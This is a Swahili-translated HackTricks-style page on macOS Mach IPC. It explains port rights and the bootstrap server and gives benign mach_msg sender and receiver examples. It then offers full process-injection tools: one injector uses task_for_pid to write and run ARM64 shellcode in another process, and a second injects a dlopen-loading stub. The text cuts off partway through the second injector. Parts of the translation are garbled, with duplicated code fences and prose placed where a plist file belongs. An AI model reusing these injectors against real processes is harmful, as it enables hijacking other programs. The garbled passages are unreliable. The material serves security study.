# macOS IPC - Mawasiliano kati ya Michakato

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Ujumbe wa Mach kupitia Bandari

### Taarifa Msingi

Mach hutumia **kazi** kama **kitengo kidogo** cha kugawana rasilimali, na kila kazi inaweza kuwa na **vijiti vingi**. Hizi **kazi na vijiti zimepangwa 1:1 kwa michakato na vijiti vya POSIX**.

Mawasiliano kati ya kazi hufanyika kupitia Mawasiliano ya Michakato ya Mach (IPC), kwa kutumia njia za mawasiliano ya njia moja. **Ujumbe huhamishwa kati ya bandari**, ambazo hufanya kama **safu za ujumbe** zinazosimamiwa na kernel.

Kila mchakato una **jedwali la IPC**, ambapo inawezekana kupata **bandari za mach za mchakato**. Jina la bandari ya mach ni kweli nambari (kielekezi kwa kitu cha kernel).

Mchakato pia unaweza kutuma jina la bandari na baadhi ya haki **kwa kazi tofauti** na kernel itafanya kuingia hii katika **jedwali la IPC la kazi nyingine**.

### Haki za Bandari

Haki za bandari, ambazo hufafanua ni operesheni gani kazi inaweza kufanya, ni muhimu katika mawasiliano haya. **Haki za bandari** zinaweza kuwa ([maelezo kutoka hapa](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Haki ya Kupokea**, ambayo inaruhusu kupokea ujumbe uliotumwa kwa bandari. Bandari za Mach ni safu za MPSC (wazalishaji wengi, mtumiaji mmoja) queues, ambayo inamaanisha kwamba inaweza kuwepo **haki moja ya kupokea kwa kila bandari** katika mfumo mzima (tofauti na mabomba, ambapo michakato mingi inaweza kushikilia viashiria vya faili kwa mwisho wa kusoma wa bomba moja).
* **Kazi yenye Haki ya Kupokea** inaweza kupokea ujumbe na **kuunda Haki za Kutuma**, kuruhusu kutuma ujumbe. Awali tu **kazi yenyewe ina Haki ya Kupokea juu ya bandari yake**.
* **Haki ya Kutuma**, ambayo inaruhusu kutuma ujumbe kwa bandari.
* Haki ya Kutuma inaweza **kufanana** hivyo kazi ikiwa na Haki ya Kutuma inaweza kufanana haki na **kuipatia kazi ya tatu**.
* **Haki ya Kutuma mara moja**, ambayo inaruhusu kutuma ujumbe moja kwa bandari na kisha kutoweka.
* **Haki ya seti ya bandari**, ambayo inaashiria _seti ya bandari_ badala ya bandari moja. Kutoa ujumbe kutoka kwa seti ya bandari kunatoa ujumbe kutoka kwa moja ya bandari inayojumuisha. Seti za bandari zinaweza kutumika kusikiliza bandari kadhaa kwa wakati mmoja, kama `chagua`/`piga kura`/`epoll`/`kqueue` katika Unix.
* **Jina la kufa**, ambalo sio haki halisi ya bandari, lakini ni nafasi tu. Wakati bandari inaharibiwa, haki zote za bandari zilizopo kwa bandari hiyo zinageuka kuwa majina ya kufa.

**Kazi zinaweza kusafirisha HAKI ZA KUTUMA kwa wengine**, kuwaruhusu kutuma ujumbe nyuma. **HAKI ZA KUTUMA pia zinaweza kufanana**, hivyo kazi inaweza kuiga na kumpa haki kwa kazi ya tatu. Hii, pamoja na mchakato wa kati unaojulikana kama **seva ya bootstrap**, inaruhusu mawasiliano yenye ufanisi kati ya kazi.

### Bandari za Faili

Bandari za faili huruhusu kufunga viashiria vya faili katika bandari za Mac (kwa kutumia Haki za Bandari za Mach). Inawezekana kuunda `fileport` kutoka kwa FD iliyopewa kutumia `fileport_makeport` na kuunda FD kutoka kwa fileport kutumia `fileport_makefd`.

### Kuweka Mawasiliano

#### Hatua:

Kama ilivyotajwa, ili kuweka njia ya mawasiliano, **seva ya bootstrap** (**launchd** kwenye mac) inahusika.

1. Kazi **A** inaanzisha **bandari mpya**, ikipata **HAKI YA KUPOKEA** katika mchakato.
2. Kazi **A**, ikiwa mmiliki wa HAKI YA KUPOKEA, **inaunda HAKI YA KUTUMA kwa bandari**.
3. Kazi **A** inaweka **mawasiliano** na **seva ya bootstrap**, ikitoa **jina la huduma ya bandari** na **HAKI YA KUTUMA** kupitia mchakato unaojulikana kama usajili wa bootstrap.
4. Kazi **B** inashirikiana na **seva ya bootstrap** kutekeleza utaftaji wa bootstrap **kwa jina la huduma**. Ikiwa mafanikio, **seva inadua HAKI YA KUTUMA** iliyopokelewa kutoka kwa Kazi A na **kuhamisha kwa Kazi B**.
5. Baada ya kupata HAKI YA KUTUMA, Kazi **B** inaweza **kutunga** **ujumbe** na kuutuma **kwa Kazi A**.
6. Kwa mawasiliano ya pande zote kawaida kazi **B** inaunda bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).

Seva ya bootstrap **haiwezi kuthibitisha** jina la huduma lililodaiwa na kazi. Hii inamaanisha **kazi** inaweza kwa uwezekano **kujifanya kuwa kazi yoyote ya mfumo**, kama vile **kudai jina la huduma ya idhini** na kisha kuidhinisha kila ombi.

Kisha, Apple inahifadhi **majina ya huduma zilizotolewa na mfumo** katika faili za usanidi salama, zilizoko katika saraka zilizolindwa na SIP: `/System/Library/LaunchDaemons` na `/System/Library/LaunchAgents`. Pamoja na kila jina la huduma, **binary inayohusiana pia imehifadhiwa**. Seva ya bootstrap, itaunda na kushikilia **HAKI YA KUPOKEA kwa kila moja ya majina haya ya huduma**.

Kwa huduma hizi zilizopangwa mapema, **mchakato wa utaftaji unatofautiana kidogo**. Wakati jina la huduma linatafutwa, launchd huanzisha huduma hiyo kwa kudumu. Mchakato mpya ni kama ifuatavyo:

* Kazi **B** inaanzisha utaftaji wa bootstrap **kwa jina la huduma**.
* **launchd** inachunguza ikiwa kazi inaendeshwa na ikiwa haiko, **inaianzisha**.
* Kazi **A** (huduma) inatekeleza **kuangalia bootstrap**. Hapa, **seva ya bootstrap inaunda HAKI YA KUTUMA, inaishikilia, na **kuhamisha HAKI YA KUPOKEA kwa Kazi A**.
* launchd inafanana **HAKI YA KUTUMA na kuituma kwa Kazi B**.
* Kazi **B** inaunda bandari mpya na **HAKI YA KUPOKEA** na **HAKI YA KUTUMA**, na kumpa **HAKI YA KUTUMA kwa Kazi A** (huduma) ili iweze kutuma ujumbe kwa KAZI B (mawasiliano ya pande zote).

Hata hivyo, mchakato huu unatumika tu kwa kazi zilizopangwa mapema za mfumo. Kazi zisizo za mfumo bado zinaendesha kama ilivyoelezwa awali, ambayo inaweza kwa uwezekano kuruhusu udanganyifu. 

### Ujumbe wa Mach

[Pata maelezo zaidi hapa](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Kazi ya `mach_msg`, kimsingi wito wa mfumo, hutumiwa kutuma na kupokea ujumbe wa Mach. Kazi inahitaji ujumbe utumwe kama hoja ya awali. Ujumbe huu lazima uanze na muundo wa `mach_msg_header_t`, ukifuatiwa na maudhui ya ujumbe halisi. Muundo huo unafafanuliwa kama ifuatavyo:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Mchakato unaomiliki _**haki ya kupokea**_ unaweza kupokea ujumbe kwenye mlango wa Mach. Kinyume chake, **wapelekaji** hupewa _**haki ya kutuma**_ au _**haki ya kutuma mara moja**_. Haki ya kutuma mara moja ni kwa ajili ya kutuma ujumbe mmoja tu, baada ya hapo inakuwa batili.

Kwa lengo la kufanikisha **mawasiliano ya pande zote** kwa urahisi, mchakato unaweza kutaja **mlango wa mach** katika **kichwa cha ujumbe cha mach** kiitwacho _mlango wa jibu_ (**`msgh_local_port`**) ambapo **mpokeaji** wa ujumbe unaweza **kutuma jibu** kwa ujumbe huu. Bitflags katika **`msgh_bits`** zinaweza kutumika kuonyesha kwamba **haki ya kutuma mara moja** inapaswa kuletwa na kuhamishiwa kwa mlango huu (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Tafadhali elewa kuwa aina hii ya mawasiliano ya pande zote hutumiwa katika ujumbe wa XPC unaotarajia jibu (`xpc_connection_send_message_with_reply` na `xpc_connection_send_message_with_reply_sync`). Lakini **kawaida milango tofauti hujengwa** kama ilivyoelezwa hapo awali ili kuunda mawasiliano ya pande zote.
{% endhint %}

Vitengo vingine vya kichwa cha ujumbe ni:

- `msgh_size`: ukubwa wa pakiti nzima.
- `msgh_remote_port`: mlango ambao ujumbe huu unatumwa.
- `msgh_voucher_port`: [vifungo vya mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: kitambulisho cha ujumbe huu, ambacho huchambuliwa na mpokeaji.

{% hint style="danger" %}
Tafadhali elewa kuwa **ujumbe wa mach hutumwa juu ya mlango wa mach**, ambao ni njia ya mawasiliano ya **mpokeaji mmoja**, **wapeleka ujumbe wengi** iliyojengwa ndani ya kiini cha mach. **Mchakato mwingi** unaweza **kutuma ujumbe** kwa mlango wa mach, lakini wakati wowote ni **mchakato mmoja tu unaweza kusoma** kutoka kwake.
{% endhint %}

### Panga milango
```bash
lsmp -p <pid>
```
Unaweza kusakinisha zana hii kwenye iOS kwa kuipakua kutoka [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Mfano wa Kanuni

Tafadhali angalia jinsi **mtumaji** anavyo **tenga** bandari, anajenga **haki ya kutuma** kwa jina `org.darlinghq.example` na kuituma kwa **seva ya bootstrap** wakati mtumaji alipoomba **haki ya kutuma** ya jina hilo na kuitumia kutuma ujumbe.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
### Swahili Translation:
```plaintext
### Tafsiri ya Swahili:
```plaintext
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### Vioja vya Kipekee

* **Bandari ya Mwenyeji**: Ikiwa mchakato ana **ruhusa ya Kutuma** juu ya bandari hii anaweza kupata **taarifa** kuhusu **mfumo** (k.m. `host_processor_info`).
* **Bandari ya mwenyeji wa priv**: Mchakato wenye **Haki ya Kutuma** juu ya bandari hii anaweza kutekeleza **vitendo vya kipekee** kama vile kupakia ugani wa kernel. **Mchakato lazima awe na mizizi** kupata idhini hii.
* Zaidi ya hayo, ili kuita API ya **`kext_request`** ni lazima kuwa na ruhusa nyingine za **`com.apple.private.kext*`** ambazo hupewa tu programu za Apple.
* **Bandari ya jina la kazi:** Toleo lisiloruhusiwa la _bandari ya kazi_. Inahusisha kazi, lakini haimruhusu kuidhibiti. Kitu pekee kinachopatikana kupitia hii ni `task_info()`.
* **Bandari ya kazi** (inayoitwa pia bandari ya kernel)**:** Ikiwa una ruhusa ya Kutuma juu ya bandari hii ni rahisi kudhibiti kazi (kusoma/kuandika kumbukumbu, kuunda nyuzi...).
* Piga `mach_task_self()` ili **kupata jina** la bandari hii kwa kazi ya mwito. Bandari hii inarithiwa tu wakati wa **`exec()`**; kazi mpya iliyoanzishwa na `fork()` hupata bandari mpya ya kazi (kama kesi maalum, kazi pia hupata bandari mpya ya kazi baada ya `exec()` katika binary ya suid). Njia pekee ya kuzindua kazi na kupata bandari yake ni kufanya ["ngoma ya kubadilisha bandari"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) wakati wa kufanya `fork()`.
* Hizi ni vizuizi vya kupata bandari (kutoka `macos_task_policy` kutoka kwa binary ya `AppleMobileFileIntegrity`):
* Ikiwa programu ina **ruhusa ya `com.apple.security.get-task-allow`** mchakato kutoka kwa **mtumiaji huyo unaweza kupata bandari ya kazi** (kawaida huongezwa na Xcode kwa ajili ya kurekebisha makosa). Mchakato wa **kuidhinisha** hautaruhusu hii kwa matoleo ya uzalishaji.
* Programu zenye **ruhusa ya `com.apple.system-task-ports`** wanaweza kupata **bandari ya kazi kwa** mchakato wowote, isipokuwa kernel. Katika toleo za zamani ilikuwa inaitwa **`task_for_pid-allow`**. Hii inatolewa tu kwa programu za Apple.
* **Mizizi inaweza kupata bandari za kazi** za programu **zisizotengenezwa** na **muda wa kukimbia ulioimarishwa** (na sio kutoka kwa Apple).

### Uingizaji wa Shellcode kwenye mnyororo kupitia Bandari ya Kazi

Unaweza kupata shellcode kutoka:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 
### Maelezo

Faili hii inaonyesha mifumo ya kibali ambayo programu inaweza kutumia kwenye mfumo wa macOS. Mifumo hii ya kibali inaweza kusaidia programu kupata ruhusa za ziada kufanya operesheni fulani kama vile ufikiaji wa folda maalum au vifaa vya mfumo.

Kwa mfano, programu inayohitaji kufikia kamera ya mtumiaji inaweza kuwa na kibali maalum kilichoorodheshwa hapa ili kuruhusu ufikiaji huo.

Faili hii ya entitlements.plist inaweza kusaidia kudhibiti upatikanaji wa programu kwa rasilimali tofauti za mfumo na kuhakikisha usalama na faragha ya mtumiaji. 
{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Kupasha** programu iliyopita na ongeza **haki za kipekee** ili uweze kuingiza msimbo na mtumiaji huyo huyo (kama sivyo utahitaji kutumia **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>  
### Maelezo ya Mawasiliano kati ya Michakato (IPC) ya macOS
IPC ni njia ambayo michakato inaweza kubadilishana data na kufanya kazi pamoja kwenye mfumo wa macOS. Kuna aina tofauti za IPC kama vile mistari ya mawasiliano, mizunguko ya ujumbe, na soketi za mtandao. Kuelewa jinsi IPC inavyofanya kazi ni muhimu katika kubaini na kuzuia mashambulizi ya usalama yanayotumia njia hizi za mawasiliano.
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Kuingiza Dylib katika thread kupitia Bandari ya Kazi

Katika macOS **threads** inaweza kudhibitiwa kupitia **Mach** au kutumia **posix `pthread` api**. Thread tuliyounda katika kuingiza ya awali, iliumbwa kutumia Mach api, hivyo **siyo inalingana na posix**.

Ilikuwa inawezekana **kuingiza shellcode rahisi** ili kutekeleza amri kwa sababu **haikuwa inahitaji kufanya kazi na posix** apis inalingana na Mach tu. **Kuingizaji za kina zaidi** zingehitaji **thread** kuwa pia **inalingana na posix**.

Hivyo, ili **kuboresha thread** ni vyema kuita **`pthread_create_from_mach_thread`** ambayo ita **umba pthread halali**. Kisha, pthread mpya hii inaweza **kuita dlopen** ili **kupakia dylib** kutoka kwa mfumo, hivyo badala ya kuandika shellcode mpya kufanya vitendo tofauti ni vyema kupakia maktaba za desturi.

Unaweza kupata **dylibs mfano** katika (kwa mfano moja inayozalisha logi na kisha unaweza kusikiliza):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
